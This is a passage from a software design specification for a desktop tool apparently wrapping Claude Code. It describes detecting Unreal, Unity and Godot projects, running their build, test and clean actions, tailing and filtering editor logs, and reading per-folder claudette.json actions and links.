  - **Clean intermediates…**, destructive. It deletes `Binaries` and `Intermediate` in the project, and in each plugin under `Plugins/` (a folder with a `.uplugin`, however deeply nested). Nothing else: not `Saved`, `DerivedDataCache`, `Content` or `Config`.
    - The confirmation lists the folders and their total size. It warns when an editor seems to have the project open: an `UnrealEditor`, `UnrealEditor-Cmd`, `UE4Editor` or `UE4Editor-Cmd` process whose command line names the `.uproject`. Where command lines can't be read, it doesn't guess.
    - The folders are deleted off the UI thread, as a job with its own entry and log, like a build's. Read-only files are made writable first, and links inside are removed without following them.
  - **End all Unreal editors…**, destructive. It ends every running Unreal editor, not just this project's, and each one's process tree, which takes ShaderCompileWorker and the like with it.
    - The editors are `UnrealEditor`, `UnrealEditor-Cmd`, `UE4Editor` and `UE4Editor-Cmd` (`.exe` on Windows; on macOS, the executable inside `UnrealEditor.app`).
    - The confirmation says how many are running and lists each with its PID and, when its command line shows it, its project: "End 2 Unreal editors?", "• UnrealEditor (PID 501): NightOwl".
    - Each is ended only if its PID still belongs to the process that was found (the same start time): one that exited while the confirmation was open may have had its PID reused by another program.
    - It's disabled with "No Unreal editor is running." when none is found. The menu checks each time it opens; where processes can't be listed, it stays enabled and doesn't guess.
- **Processes by name** (`ISystemProcesses` in Core, `SystemProcesses` in `Claudette.Platform`), shared by every project type, with the process monitor's own ways of reading processes: a Toolhelp snapshot and `NtQueryInformationProcess` for command lines on Windows, `/proc` on Linux (the `exe` link, else the first argument, since `comm` is cut to 15 characters), and one `ps` run on macOS, where a program's path can have spaces (`/Users/Shared/Epic Games/…`), so its name is taken from the longest start of the command line that is a file. Claudette itself is never listed. Ending a tree uses .NET's `Process.Kill(entireProcessTree: true)`.
- **Running `.bat` files on Windows.** They run as `cmd.exe /d /s /c ""<bat>" <args>"`: `/d` skips AutoRun, and `/s` takes off only the outer quotes. cmd doesn't read its command line by the rules .NET quotes arguments with, so `CommandLines.BatchFile` builds it and the launcher passes it as it is (`ProcessStartSpec.CommandLine`). An argument is quoted when it has a space or a character cmd treats specially; an option such as `-project=<path>` has only its value quoted, as Unreal's tools write it. An argument with a quote or a line break is refused. `.sh` files run through `/bin/bash`.
- **Telling Claude.** With **Tell Claude about Unreal Engine projects** on (the default), a session that starts in a detected project gets a note through `--append-system-prompt`, before Perforce's note when both apply ([§18](#perforce-ticket-handling)):
  > This is an Unreal Engine 5.4 project, NightOwl, at D:\Games\NightOwl\NightOwl.uproject.
  > The engine is at C:\Program Files\Epic Games\UE_5.4 (a launcher install).
  > To build the editor, run: "C:\Program Files\Epic Games\UE_5.4\Engine\Build\BatchFiles\Build.bat" NightOwlEditor Win64 Development -Project="D:\Games\NightOwl\NightOwl.uproject" -WaitMutex
  > To regenerate project files, run: "C:\…\Build.bat" -projectfiles -project="D:\Games\NightOwl\NightOwl.uproject" -game -progress
  > Don't start the editor or packaging unless asked.
  - It's about 550 characters for typical paths. The build command uses the project's configuration as the session starts.
  - The tab info card ([§4](#4-tabs--sessions)) gets a **Project** row: "NightOwl: Unreal Engine 5.4.2 · launcher install. Claude was told how to build it."

**Unity.**

- **Finding the project.** A folder with `ProjectSettings/ProjectVersion.txt` and `Assets/`, found as above. Its name is the folder's (the C# solution is named after it); `productName` and `companyName` from `ProjectSettings/ProjectSettings.asset` are shown and name the player log's folder.
- **The version** is `m_EditorVersion` (`2022.3.20f1`), with the changeset from `m_EditorVersionWithRevision` when it's there. The project's icon's tooltip shows `Unity 2022.3`.
- **Finding the editor** for that exact version (`UnityEditors`). Only an editor that exists counts.
  - A pick remembered for the project, from **Choose Unity editor…**: the executable, or a version's folder or `Unity.app` that holds it.
  - Unity Hub's default folder: `C:\Program Files\Unity\Hub\Editor\<version>\Editor\Unity.exe`, `/Applications/Unity/Hub/Editor/<version>/Unity.app/Contents/MacOS/Unity`, `~/Unity/Hub/Editor/<version>/Editor/Unity`.
  - Hub's custom install folder, `secondaryInstallPath.json` (a JSON string) in Hub's config folder: `%APPDATA%\UnityHub`, `~/Library/Application Support/UnityHub` or `~/.config/UnityHub`.
  - Editors added to Hub by hand: `editors-v2.json` (`{ "data": [ { "version", "location" } ] }`) or the older `editors.json` (`{ "<version>": { "version", "location" } }`) in the same folder, read tolerantly; a location can be a string or a list.
  - When the version isn't installed, the project menu's header says so and offers **Choose Unity editor…**.
- **Whether Unity has the project open.** `Temp/UnityLockfile` exists and a `Unity` process's command line names the project. A lock left by a crashed editor doesn't count. Where processes can't be listed, or a Unity process's command line can't be read, the lock file alone counts, since Unity refuses a locked project anyway.
- **Actions.**
  - **Open in Unity** (the main action), detached: `Unity -projectPath "<path>"`. The per-project radio **Code optimization: Release / Debug** (its default from Settings, Release) adds `-debugCodeOptimization` for Debug, and the label says "Open in Unity (Debug)". While the project is open it reads **Unity has this project open**, disabled.
  - **Run EditMode tests**, a job: `Unity -batchmode -projectPath "<path>" -runTests -testPlatform EditMode -testResults "<results>" -logFile -`. Unity quits by itself when the tests are done. The results file is in Claudette's data folder (`project-jobs/`), deleted before each run; when the job ends, its status adds the counts from the NUnit XML: *"Run EditMode tests failed (exit code 2). 11 passed, 1 failed."*
  - **Regenerate the C# solution**, a job: `Unity -batchmode -quit -projectPath "<path>" -executeMethod <method> -logFile -`. The method comes from the IDE package in `Packages/manifest.json`: `com.jetbrains.rider`'s `Packages.Rider.Editor.RiderScriptEditor.SyncSolution`, or `com.unity.ide.visualstudio`'s `Microsoft.Unity.VisualStudio.Editor.VisualStudioEditor.SyncAll`, which a project with the old `com.unity.ide.vscode` package also uses when it has it. Rider's comes first when Settings opens solutions with Rider. Without either package, it's disabled and says why.
  - **Open solution**: `<FolderName>.sln` in the project's folder, disabled when missing, opened like Unreal's with the IDE from Settings.
  - **Open Editor log**: `%LOCALAPPDATA%\Unity\Editor\Editor.log`, `~/Library/Logs/Unity/Editor.log` or `~/.config/unity3d/Editor.log`.
  - **Open Player log**: `%USERPROFILE%\AppData\LocalLow\<company>\<product>\Player.log`, `~/Library/Logs/<company>/<product>/Player.log` or `~/.config/unity3d/<company>/<product>/Player.log`. Disabled when missing.
  - **Clean Library…**, destructive: deletes `Library`, `Temp` and `obj` in the project, and nothing else. The confirmation warns that Unity reimports every asset next time, which can take a long while, and shows the size.
  - **End all Unity editors…**, destructive: every `Unity` process (`Unity.exe` on Windows) and its tree, with the project from its `-projectPath`, as Unreal's. Not Unity Hub, and not Unity's own helpers such as `UnityShaderCompiler`, whose names differ.
  - While Unity has the project open, EditMode tests, regenerating the solution and Clean are refused: "Unity has this project open, and locks it while it does: close the editor first."
- **Telling Claude.** With **Tell Claude about Unity projects** on (the default):
  > This is a Unity 2022.3.20f1 project, NightOwl, at /g/NightOwl.
  > The editor is at /opt/Unity/Hub/Editor/2022.3.20f1/Editor/Unity.
  > To run the EditMode tests, with the editor closed, run: /opt/Unity/Hub/Editor/2022.3.20f1/Editor/Unity -batchmode -projectPath /g/NightOwl -runTests -testPlatform EditMode -testResults /g/NightOwl/Logs/EditModeResults.xml -logFile -
  > Library/, Temp/ and obj/ are generated: don't edit them.
  > A .meta file must move and be renamed with its asset.
  > Don't open the editor unless asked.

> **Still to verify with Unity installed:** each Hub layout and file as Hub writes them; the lock file with a real editor; regenerating the solution with each IDE package in batch mode (the methods are the packages' public entry points, but running them with `-executeMethod` hasn't been tried); the results file of `-runTests`; and the logs' places on each OS.

**Godot.**

- **Finding the project.** A folder with `project.godot`, found as above. It's a Godot `ConfigFile`, read line by line and tolerantly:
  - `config_version`: 5 is Godot 4, 4 is Godot 3.
  - `config/name` under `[application]`, else the folder's name.
  - `config/features`, such as `PackedStringArray("4.3", "C#", "Forward Plus")` (`PoolStringArray` in Godot 3): its first version is the project's (`Godot 4.3`), else `config_version` gives `Godot 4` or `Godot 3`.
  - It's a C# project when its features have `C#`, it has a `[dotnet]` or `[mono]` section, or its folder has a `.sln` or `.csproj`.
- **Finding Godot** (`GodotExecutables`). There's no standard install, so in order:
  1. a pick remembered for the project, from **Choose Godot executable…**;
  2. the path on Godot's page in Settings → Project tools;
  3. `godot`, `godot4`, `Godot` or `godot-mono` on the `PATH`;
  4. on macOS, `/Applications/Godot.app` or `/Applications/Godot_mono.app`;
  5. on Windows, Scoop's shims (`~\scoop\shims\godot.exe`, `godot-mono.exe`), WinGet's `Links\godot.exe`, and the newest `Godot*.exe` in WinGet's `GodotEngine.GodotEngine*` package folder, not the console one.
  - **Detect** in Settings runs 3–5 and fills in the path.
  - A C# project needs the .NET ("mono") build of Godot: one whose name has `mono` in it, or with a `GodotSharp` folder beside it (in `Contents/Resources` on macOS). When the Godot found isn't one, the project menu's header says so.
- **Actions.**
  - **Open in Godot** (the main action), detached: `godot --editor --path "<folder>"`.
  - **Run project**, detached: `godot --path "<folder>"`.
  - **Build C#**, a job, for C# projects: `dotnet build "<Name>.sln"`, or the `.csproj` when there's no `.sln`. Disabled until Godot has made them.
  - **Open solution**, for C# projects: the `.sln`, disabled when missing.
  - **Clean .godot…** (Godot 4) or **Clean .import…** (Godot 3), destructive: deletes that folder, with a confirmation that Godot reimports every asset next time.
  - **End all Godot editors…**, destructive: every process whose name starts with `godot` (any build, such as `Godot_v4.3-stable_mono_win64`), with the project from its `--path`, never Claudette itself.
- **Telling Claude.** With **Tell Claude about Godot projects** on (the default):
  > This is a Godot 4.3 project (C#), Night Owl, at /g/owl.
  > To check it without the editor, run: /opt/godot-mono --headless --path /g/owl --quit
  > To check one script, run: /opt/godot-mono --headless --path /g/owl --check-only --script res://path/to/script.gd
  > To build the C# code, run: dotnet build '/g/owl/Night Owl.sln'
  > Don't open the editor unless asked.

> **Still to verify with Godot installed:** each place Godot is looked for, the .NET build check, `--check-only` on Godot 3 and 4, and End all Godot editors with real editors.

**Editor logs.** ✅ Built 2026-10-20. While one of a project's engine processes runs, such as the Unreal editor or a commandlet, the log it writes shows under one of the project's tabs and in the main area, read as it's written and never held open, and it stays after the process ends.

- **What counts.** A process of the project's engine whose command line names the project. What it is comes from its command line:
  - **Unreal:** `UnrealEditor`, `UnrealEditor-Cmd`, `UE4Editor` or `UE4Editor-Cmd` with the `.uproject`: *Unreal editor*, *Unreal commandlet ResavePackages* (`-run=`, without its `Commandlet`), *Unreal editor (command line)* (`-Cmd` without `-run=`), *Unreal game* (`-game`) or *Unreal server* (`-server`).
  - **Unity:** `Unity` with the project's folder after `-projectPath`: *Unity editor*, or *Unity (batch mode)* with `-batchmode`. A relative one, as `-projectPath .` from a batch run Claude starts in the project's folder, is read against the process's working folder, which Claudette reads from the OS (the process's PEB on Windows, `/proc/<pid>/cwd` on Linux, `proc_pidinfo` on macOS); and once Unity has its project open it works in the project's folder, so a process working there with a relative one counts too. Without its working folder, a relative one doesn't count. So does the check that Unity has the project open, which turns off **Open in Unity** and the jobs while it does.
  - **Godot:** a `godot*` process with the project's folder after `--path` (a relative one read against its working folder, as Unity's), or `project.godot` on its command line, and not the project manager (`-p`, `--project-manager`): *Godot editor* (`-e`, `--editor`), *Godot (headless)* (`--headless`), else *Godot game*.
  - Claudette's own jobs count too, such as a `claudette.json` action that runs a commandlet. Unity's EditMode tests and solution sync write to standard output (`-logFile -`), so they have no file; their run has the output.
- **Which file.**
  - **Unreal:** `-abslog=<path>`, then `LOG=<name>` (or `-log=<name>`) in `Saved/Logs`, with `.log` added when the name has no extension; otherwise `Saved/Logs/<Name>.log`, or `<Name>_2.log` and on, to `_9`, while another process has that one open. Of those, a process took the one whose first line, *Log file open, 10/20/26 15:01:22* in the machine's time, is the soonest at or after it started (less 5 seconds, since the line gives the time to the second) that no other running process has, and it keeps it while it runs. Without the times to go by, the first that's there and free. One whose file isn't there yet is looked at again at the next look.
  - **Unity:** `-logFile <path>`, relative to the project. Else, without `-useGlobalLog`, the project's own `Logs/Editor.log` when it has been written since the process started, as Unity 6.5 and later write it once the editor has the project open ("A log that moves", below). Else the machine's `Editor.log`, the one **Open Editor log** opens, which can move. `-logFile -` writes none.
  - **Godot:** `--log-file <path>`, else the project's `file_logging/log_path` (in `[debug]` in Godot 4, `[logging]` in Godot 3; `user://logs/godot.log` by default), `user://` being the project's user data folder: `%APPDATA%\Godot\app_userdata\<name>`, `~/Library/Application Support/Godot/app_userdata/<name>` or `~/.local/share/godot/app_userdata/<name>`, or the folder `config/custom_user_dir_name` names in place of `Godot/app_userdata/<name>` with `config/use_custom_user_dir` on. The name's `\ / : * ? " < > |` become `_`. With `file_logging/enable_file_logging.pc` off, none.
  - A file two processes write, such as Godot's editor and the game it runs, is one log.
- **Which tab.** Each file is one log for the whole app, under one of the project's tabs: the tab whose own processes include one of its writers (its `claude`'s, as when Claude ran a commandlet, or its project job's); else the tab whose launch action (**Launch editor**, **Open in Unity**, **Open in Godot**, **Run project**, a `claudette.json` launch) started the project's engine in the 2 minutes before; else the first of the project's tabs in the sidebar, which puts a thread's before its sub-threads. It stays under that tab while the tab is open with that project. When the tab closes, the log moves to the next by the same rule, keeping its lines, and it goes once no tab has the project. A worktree tab has the worktree's project, so an editor opened on the main checkout's goes under one of the main checkout's tabs.
- **A log that moves.** ✅ Built 2026-10-28. From Unity 6.5, the editor writes the machine's `Editor.log` while it starts, then, once it has the project open, copies that to the project's `Logs/Editor.log` and writes only there, saying so in the machine's: `Logs moved to project-relative Editor.log file, and subsequent logs will only be written to this file.`, then the file on the next line, `F:/Unity/projs/myproj/Logs/Editor.log`, with forward slashes even on Windows. **Use Global Editor Log** in Unity's preferences, or `-useGlobalLog`, keeps it in the machine's, and the line doesn't come.
  - **The line.** Matched by its start, *Logs moved to project-relative*, anywhere in its line, since Unity's `-timestamps` puts the time before it. The file is on the next line that isn't blank, or after the sentence on its own line: a full path from where it starts (`F:/`, `C:\`, `\\server\`, `/`), else the last word, ending in `.log`, with either slash, a relative one read against the project's folder. Without one, it's the project's `Logs/Editor.log`. A sentence that ends a read waits one read for its file.
  - **Whose move.** The machine's log is every editor's, so it can have several editors' startups and their lines. The file says which project moved: the one whose folder holds it, of those whose editors write the log. A move to a project no tab has is ignored. One to another tab's project moves that project's editor, whose log is then a row of its own under one of its tabs ("Which tab", above), and leaves this log as it is. An editor with `-useGlobalLog` or `-logFile` never moves.
  - **The log's own move.** Its editor writes the file from then on, while it runs, whether the file is there yet or not; it's read as soon as it is. The log stops at the line naming the file and is read no more, so what other editors write there next isn't its. Its row stays, its icon muted, saying where the log went, *Moved to Logs/Editor.log* (the file relative to the project's folder, with the OS's separator) and its counts, and over its log *Unity editor moved its log to Logs/Editor.log at 14:31.* The file is a log of its own, under the same tab, read from its first line, which has what the editor wrote as it started: a new row, or the file's row coming back to life, as when the editor starts again. When the editor ends, the old row goes, since the new one has it all, and the new one stays, *Closed*. × takes the old row away at once. One that was ×'d away when the move came is gone, and the new row stays away until the editor next starts, as it would have.
  - **Found at a look.** When Claudette starts after the move, or the line is in the part of a big log the first read passes over, there's no line to read: a Unity process with neither `-logFile` nor `-useGlobalLog` whose project's `Logs/Editor.log` has been written since it started writes that, so it's followed from the first look, and the machine's log has no row. The editor's version isn't read: Unity before 6.5 never writes that file, and 6.5 keeping to the machine's log leaves it as an earlier session did, while the executable's path doesn't always say the version and `ProjectVersion.txt` is the project's, not the running editor's. Without the process's start time, the machine's log is followed, and its line moves it. A process found writing another file than at the last look, before its line has been read, has moved in the same way; its old log stops at the line if what's new in it has the line.
- **Looking.** Every 2 seconds (5 on macOS, where each look runs `ps`), off the UI thread, one `ISystemProcesses.Find` for the names of every followed project's engine, and only while a tab's project has logs; also at the next read after one of the project's launch actions. Each log being written is read once a second, and once more after its processes have gone.
- **Never holding the file.** Each read opens it for reading only, sharing read, write and delete, reads what's new from where the last read stopped, and closes it. So between reads Claudette has no handle on it, and during one the editor can still write it, rename it (Unreal's backup at its next start) or delete it. Nothing watches the file or its folder: a watcher would hold a handle on `Saved/Logs`. A file that can't be opened just then waits for the next read. A last line without its line break waits for it, until its processes have ended.
  - **A new file in its place**, as when an editor starts again (Unreal's backup and new log, Unity's `Editor-prev.log`, Godot's renamed one): it got shorter than what was read, or its first 256 bytes changed. Not its creation time: NTFS gives a file made under the same name within 15 seconds the old one's creation time, which is just what an editor's rename and new file is. New processes writing it, with none of the old ones left, start it afresh too.
  - **A big file:** the first read starts at the first line in its last 4 MB. The lines before it are counted, not kept.
- **What it keeps.** At most its last 20,000 lines, dropping the oldest 2,000 at a time. The counts cover the whole file.
- **Its lines.** ✅ Entries and columns built 2026-10-21. Each line is read as part of an entry: a line that starts one, with its level and, in Unreal's, its category, and the lines that carry it on, such as a message's second line or a stack trace, which take its level and category and are filtered with it. Only entries are counted, on the row and the filter. An error's lines are in the error color and a warning's in the warning color, a stack trace's lines and a verbose entry's muted. An entry is an error or a warning by the engine's own markers, whatever else its line says:
  - **Unreal:** `LogBlueprint: Error:` and `Warning:` (and `Fatal:` and `Fatal error:`), with or without the time and frame before them, and a compiler's `error C2065:`, `: error:` and `: warning:`, as Live Coding writes them.
  - **Unity:** the C# compiler's `error CS0103` and `warning CS0168`, an exception's `NullReferenceException:`, and lines that start with `Error` or `Warning`.
  - **Godot:** `ERROR:`, `SCRIPT ERROR:`, `USER ERROR:`, `SHADER ERROR:` and `FATAL:`, and the warnings' `WARNING:` and the like.
  - **Unreal's entries.** `[2026.10.20-19.01.22:123][  0]LogBlueprint: Error: Missing node`: the time and the frame (Unreal's frame counter, to 1,000; not a thread), the category, the verbosity, which a Log line doesn't have, and the message. As the editor starts, before the times do, `LogInit: Display: Starting`. Once lines have times, one without carries on the entry before, unless it has a category and a verbosity of its own. `Log file open, …` and `Log file closed, …` are lines of their own. A line that carries an entry on but has an error's or a warning's marker of its own is an entry of its own, where it is.
  - **Unreal's columns.** Each of Unreal's lines shows in columns: the time in the machine's (`15:01:22.123`), muted; the category, in the accent, as wide as the longest the log has, to 24 characters; the verbosity, in its level's color; then the message. A line carrying an entry on starts under its message, as a wrapped line's later rows do. Only what's drawn changes: underneath it's the file's text, which is what's selected, copied and found. Unreal writes the times in UTC by default; read as the machine's time, a log whose first time is nearer when it opened, as its first line says, has its own (`LogTimes=Local`), shown as they are. Seconds since the start (`[0012.34]`) show as `12.34s`, and any other time as its brackets have it.
  - **Unity's entries.** A script's message carries on into its stack trace, `UnityEngine.Debug:LogWarning (object)` and the frames under it, then `(Filename: Assets/Player.cs Line: 12)`, and an exception into its frames; a blank line carries on the entry before it. The trace says what a script's message is: `LogWarning` a warning, `LogError`, `LogException` and `LogAssertion` an error. A message whose trace comes in a later read than it keeps the level it was shown with.
  - **Godot's entries.** An error's or a warning's indented lines under it, `   at: get_node (scene/main/node.cpp:1364)` and a GDScript backtrace's, carry it on. Every other line, what `print` writes among them, is one of its own.
  - **A crash** is in the log: Unreal's `=== Critical error: ===` or an assertion's `Fatal error: [File:`, Unity's `Crash!!!` or `Native Crash Reporting`, Godot's `CrashHandlerException` or `Program crashed with signal`. The row and the log say *Crashed* rather than *Closed*.
- **Its row** under the tab is in [§4](#sidebar), "Editor logs".
- **In the main area.** As a run's log is: in the focused pane, as a tab of the panes (**Open beside**, dragging its row onto a pane, a pane header with **Close pane**), with `Ctrl/Cmd+F` to find in it, and its paths and web addresses as links, a path read against the project's folder, then its tab's. A header: the log icon, the file's name, its status line (*Unreal editor running since 14:30 (PID 4412).*, *Unreal editor closed at 15:02.*, *Unreal editor crashed at 15:02.* in the error color), the counts, *Started 14:30 · ran 32m 10s* once it has ended, the file's path, and *Showing the last 20,000 lines; the earlier ones are in the file.* when they are; then **Stay current** and **Wrap lines**, as a run's log has ("A run's log", above), **Open file**, which opens the file in Claudette's editor or the OS's app, as Settings → Files and diffs says, **Copy**, the lines the filter shows, as the file has them, and **Close**. Under the header, its filter (below). Showing it marks its errors seen.
  - `Ctrl/Cmd+W` closes it, as its × does. `Ctrl+Tab` and `Ctrl/Cmd+1…9` go through session tabs only, as from a run's log.
- **Filtering it.** ✅ Built 2026-10-21. A bar under the header:
  - **A chip for each level** its engine has, with how many entries it has: *Errors*, *Warnings*, *Display*, *Log* and *Verbose* for Unreal (its Fatal with the errors, its VeryVerbose with the verbose), *Errors*, *Warnings* and *Messages* for Unity and Godot. A chip shown is picked out, as a selected row is, an error's or a warning's count in its color; a click hides its level's entries, and the chip is muted. Its tip: *"Showing Display lines: click to hide them"*, *"Hiding Display lines: click to show them"*.
  - **Categories ▾**, for Unreal: a menu with a search box (*Find a category*), **Show all** and **Hide all** for the categories it lists, so hiding all then ticking one shows only that one, and a tick box for each category the log has, by name, with its entries. It reads *Categories (38 of 41)* while some are hidden. A new category comes in shown.
  - **Filter lines**, on the right: only lines with the text in them are shown, ignoring case, as it's typed; × clears it. It's a filter, not find: `Ctrl/Cmd+F` still finds within what's shown.
  - *Showing 1,204 of 20,000 lines* beside them while anything is hidden.
  - **Whose they are.** The levels and categories hidden are the project's: Claudette remembers them (the project's `logs.hiddenLevels` and `logs.hiddenCategories` in `state.json`), and the project's next log starts with them, as does the same log when its editor starts again. Showing them all forgets them. The text is the log's own, and isn't kept.
  - The counts are of the whole file, as the row's are, so a level may have entries that are only in the file.
- **Closing it.** × on its row or over it, its menu's **Close** or `Ctrl/Cmd+W` takes it from the sidebar and the panes. While its processes run, it stays away until new processes write its file, as when the editor starts again. Once they have ended, it's gone, and the next to write the file makes a log of its own.
- **Starting again.** When new processes write the file, the same row comes back to life, with the new log from its first line in place of the old one, and its counts afresh.
- **Not saved.** Like runs, logs aren't kept with the tabs: the app state keeps their tab when one has the focus, and after a restart a log whose processes still run comes back at the first look.
- **Collapsed** under its tab ([§4](#sidebar), "Collapsing a tab"), a log makes the badge ✕ while it has crashed, or has errors that came since it was last on screen. A running editor's log never shows the busy dot: an editor open for hours isn't work going on.
- **Settings → Project tools → All tools → Show editor logs under the tab**, on by default. Turned off, nothing is followed, and the logs showing go.
- **How it's built.** Core's `ProjectTools/EditorLogs`: `EditorLogSource`, on `ProjectInfo.Logs` from each project type's `UnrealLogs`, `UnityLogs` or `GodotLogs`, says which processes are the project's, where each writes, its levels, and how to read its lines; `CommandLineOptions` reads their command lines; `LogTail` reads a file without holding it; `EditorLogParser`, one for each log (each engine's `LineParser`), reads its lines as entries into `LogLine`s, with their `LogColumns` for Unreal, and counts them (`LogCounts`); a `LogMoveReader`, one for each log whose engine's logs move (`UnityLogs.MoveReader`, on `EditorLogSource.NewMoveReader`), reads where it says it moved to; and `EditorLogTracker` says which logs are being written, moves a project's processes to the file a line names (`Move`, for writers whose `EditorLogWriter.CanMove`), and finds those writing another file at a later look (`LogMove`). In the app, `Services/EditorLogService` looks and reads off the UI thread, stopping a log at its own move and saying so (`Moved`), `ShellViewModel.EditorLogs.cs` puts each log under its tab (`tab.ProjectTools.Logs`), keeping one moved from its file apart from the file's own until its processes end (`MovedLogs`), and `EditorLogViewModel` is its row and its log in the main area, a `LogTabViewModel` as a run's is, with its filter in `EditorLogViewModel.Filter.cs` (`LogLevelChip`, `LogCategoryChoice`). `Views/EditorLogView` shows it, with `Views/LogMirror`, which `ProjectRunView` shares, keeping its editor in step with the lines its filter shows, `LogLineColorizer` coloring them and `LogColumnsGenerator` drawing Unreal's columns in place of their parts (AvaloniaEdit's `FormattedTextElement`s). Tested by `LogTailTests`, `EditorLogTests` and `EditorLogParserTests` in Core, `EditorLogsTests` for the tabs and `ProjectToolsUiTests`.

> **Still to verify:** with real Unreal editors on each OS, the share mode Unreal writes its log with, the `_2` names, the backup at the next start, and the first line's format and time zone; with Unity, which editor writes `Editor.log` when several are open, `Editor-prev.log`, the lines it marks, and its scripts' stack traces in the log (`UnityEngine.Debug:LogWarning (object)`, with `-stackTraceLogType` and the Player settings' Stack Trace Logging); with Unity 6.5, the line saying the log moved and its path's form on each OS, whether the machine's log starts afresh at each editor's start in this mode, whether the project's log has the line too, that the project's `Logs/Editor.log` isn't written before the move or by older versions, whether the move starts it afresh or adds to an earlier session's, and whether batch mode moves its log too; with Godot, its errors' indented lines in the file as it writes them, whether the editor writes the project's `user://logs/godot.log` as the game it runs does, Godot renaming it while the editor has it, and `--log-file`.

**claudette.json.** A folder's own actions and links are in two files in the tab's folder (only there; they aren't looked for elsewhere):

- `claudette.json` is shared: committed with the project.
- `claudette.local.json` is personal, and belongs in `.gitignore`. It has the same shape, and its entries come after the shared file's.
- Both are read tolerantly, like everything else Claudette reads: comments and trailing commas are fine, unknown fields are ignored, and a bad entry is skipped with a reason, which the project's menu and the Project page show ("claudette.json: actions[2] has no command, so it was skipped."). A file that isn't JSON is skipped whole, with the parser's reason. A missing file means nothing.

```json
{
  "actions": [
    { "name": "Run tests", "command": "dotnet test", "folder": "src", "mode": "output" },
    { "name": "Open Grafana", "command": "start https://grafana.example", "mode": "launch", "os": ["windows"] },
    { "name": "Play the build", "command": "Build\\Game.exe", "mode": "launch", "ifExists": "Build/Game.exe" },
    { "name": "Install packages", "command": "npm ci", "runOnNewWorktree": true }
  ],
  "links": [
    { "name": "Board", "url": "https://example.atlassian.net/jira/software/projects/ABC/boards/1" },
    { "name": "Pull request", "url": "https://github.com/org/repo/compare/{branch}?expand=1" }
  ]
}
```

- **Actions.**
  - `name` and `command` are required.
  - `folder` is relative to the tab's folder; the tab's folder by default.
  - `mode` is `output` (the default: a run in the sidebar with its log in the main area, **Stop**, and the notification) or `launch` (started and left alone).
  - `os` is optional: `windows`, `macos` or `linux`. An action whose `os` leaves out this machine isn't shown.
  - `ifExists` is optional: a path, or a list of paths, relative to the tab's folder. The action is shown only while every one of them exists, as a file or a folder; otherwise it's left out without a reason, like an action for another OS. It's checked each time the files are read (below), so an action that runs a build appears once a build has made it, at the latest when the build's own action ends or the menu opens.
  - `runOnNewWorktree` is optional: `true` also runs it on its own in each new worktree a worktree tab makes ([below](#project-tools), "Setting up a new worktree"). Anything else leaves it to a click.
  - Commands run through the user's shell: `cmd.exe /d /s /c "<command>"` on Windows, `$SHELL -c` (or `/bin/sh -c`) elsewhere. Otherwise they run like built-in actions.
  - An action's id is its file and position, such as `shared:0`, which Stop and the notification use.
  - They're listed in the project's menu after the project's actions, under a separator.
- **Picking up edits.** The files are read again when the tab is selected, when Claudette comes to the front, when a turn ends (Claude may have edited them), when the project's menu opens, and after the in-app editor saves. Reads are numbered as they start, and one that finishes after a later one has been shown is dropped, so quick saves in a row never leave a tab showing an older file (and a detection from before a choice never undoes it). Claudette doesn't watch them with the file system: a watcher per tab runs into the OS's limits (128 inotify instances per user on many Linux machines) and doesn't work on some network drives, and these moments cover when an edit can matter.
- **The in-app editor.**
  - It's in Settings, on the tab's **Actions** page ([§14](#the-projects-pages)); it was in **Tab settings…** until milestone 15, which now points there.
  - **Add an action…** opens Settings on that page with a small dialog: name, command, working folder, **Only show when this exists** (`ifExists`), **Run with output** or **Launch and forget**, **Also run it in each new worktree a worktree tab makes** (`runOnNewWorktree`), and which file it goes in, **Just me (claudette.local.json)** (the default) or **Shared with the project (claudette.json)**. The dialog scrolls when the window is shorter than it, as it is at the size Settings opens at.
    - **Only show when this exists** is empty for an action that's always shown. **Browse…** picks a file and writes it relative to the tab's folder, with forward slashes so a shared file works on every OS; a folder is typed. Several paths are separated by semicolons.
  - The page has a choice of the two files, and the chosen file's actions with **Add…**, **Edit…**, **Remove**, **Move up**, **Move down** and **Open file**. Entries for other OSes are listed, marked "only on …", entries with `ifExists` are marked "only when … exists" (whether it does now or not), those for new worktrees "runs in each new worktree", and entries that can't be read are listed with their reason and can only be removed. Like the rest of Settings, each change is saved as it's made.
  - Saving reads the file as JSON, replaces only `actions`, keeps every other key and each entry's other fields (such as `os`, which the dialog doesn't edit), and writes it indented. The page says so: saving rewrites the file, so comments in it are dropped. A file that isn't valid JSON is never overwritten; the editor says to fix it by hand first.
- **No confirmation.** Actions from `claudette.json` run on a click, exactly like those from `claudette.local.json`: the user chose not to be asked first, although a project from someone else can put any command behind a friendly name. Hovering one shows its whole command first.
  - `claudette.local.json` is the user's own file, so its actions run without asking.
  - Nothing from these files runs on its own except the actions marked `runOnNewWorktree`, when a worktree tab makes a worktree (below), and from `claudette.json` only in a folder the user trusts, as Claude Code runs a folder's own hooks ([§7](#folder-trust)). Everything else runs only on an explicit click or the main action's shortcut.
- **Setting up a new worktree.** A new worktree is a fresh checkout: no installed dependencies, and none of the files git ignores, such as a local `.env`. Actions marked `runOnNewWorktree` set it up.
  - **When.** Once Claude Code has made the worktree for a worktree tab ([§4](#worktree-tabs)), as its first `system/init` names it. Not when it opens one that was already there, as after a restart before the first turn: Claudette notes before starting whether the worktree exists.
  - **Which.** They're read from the main checkout's files, where `claudette.local.json` is (git ignores it, so the worktree has none), in their order. Those from `claudette.local.json` always run. Those from `claudette.json` run only while the main checkout is trusted and the tab uses its configuration; otherwise a note names them and says they can be run from the project's menu, or the folder trusted from the tab's menu.
  - **How.** In the worktree (`folder` is relative to it), with `CLAUDETTE_WORKTREE` and `CLAUDETTE_MAIN_CHECKOUT` in their environment, so one can copy what the checkout has: `copy "%CLAUDETTE_MAIN_CHECKOUT%\.env" .env` on Windows, `cp "$CLAUDETTE_MAIN_CHECKOUT/.env" .` elsewhere. A note says *"Setting up the new worktree: Install packages, Copy .env."* `launch` ones start at once; `output` ones run as jobs, one after another, each only once the one before it succeeded, with their runs under the tab's row as any job's ([§4](#sidebar)).
  - They stay in the project's menu, to run again by hand.

**Links.**

- **In the project's menu**, the menu of the project's icon on its group's row, under a **Links** heading after the folder's custom actions: the shared file's, then the local file's. The row is there for every tab, so a folder with links and nothing else has them too. (Until milestone 15 they also had a section of the sidebar above History; the menu made it redundant.)
- **Opening.** A click opens the link in the browser (`IPlatformServices.OpenUrlAsync`). Hovering shows the address it opens. Links are marked ↗; favicons would need network requests, so there are none.
- **Allowed schemes.** Only `https`, `http` and `mailto`. Anything else (`file:`, `javascript:`, an app's own scheme) is shown disabled with the reason, and never opened. So is an address that isn't absolute.
